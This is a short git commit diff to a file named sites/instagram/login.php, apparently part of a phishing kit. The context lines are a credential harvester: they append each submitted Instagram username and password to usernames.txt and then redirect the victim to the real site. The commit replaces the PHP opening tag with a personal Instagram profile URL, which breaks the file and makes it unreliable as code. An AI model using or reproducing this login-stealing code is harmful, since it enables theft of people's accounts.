09d5979eb2cadc95f53346f3b8c806cc144ea59f
jokerman367 <58877923+jokerman367@users.noreply.github.com>
2019-12-19 20:04:06 +0700

    https://www.instagram.com/melissadira1/?hl=th

--- sites/ instagram/login.php
+++ sites/ instagram/login.php
@@ -1,4 +1,4 @@
-<?php
+https://www.instagram.com/melissadira1/?hl=th
 
 file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://instagram.com');
